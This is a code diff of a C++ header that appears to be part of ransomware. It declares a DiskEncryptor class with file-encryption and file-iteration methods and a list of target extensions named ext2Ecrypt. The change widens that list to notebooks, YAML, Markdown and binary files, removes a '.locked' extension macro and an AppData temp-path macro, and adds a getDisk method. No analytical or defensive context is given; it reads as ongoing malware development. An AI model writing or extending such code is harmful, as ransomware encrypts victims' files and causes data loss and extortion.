@@ -6,8 +6,6 @@
 
 #include "headers.h"
 
-#define TABLE_TEMP_FILE(username, disk) "C:\Users\." username "\AppData\Local\Temp\." disk ".tmp"
-#define FILE_EXTENSION ".locked"
 
 const std::string ext2Ecrypt[] = {
 ".zip", ".rar", ".pdf", ".img", ".jpeg", ".png", ".docx", ".xlsx",
@@ -15,7 +13,8 @@ const std::string ext2Ecrypt[] = {
 ".mkv", ".jpg", ".gif", ".bmp", ".html", ".css", ".js", ".xml",
 ".json", ".sql", ".log", ".ini", ".cfg", ".sh", ".py", ".cpp", ".h",
 ".java", ".class", ".jar", ".php", ".asp", ".jsp", ".c", ".cs", ".pl",
-".rb", ".psd", ".ai", ".eps", ".svg", ".tiff", ".tif"
+".rb", ".psd", ".ai", ".eps", ".svg", ".tiff", ".tif", ".ipynb", ".yml", ".md",
+".bin"
 };
 
 class DiskEncryptor
@@ -40,6 +39,8 @@ public:
 
 	bool fileEncrypt(std::string file);
 	void iterateFiles();
+
+	std::string* getDisk();
 
 
 };
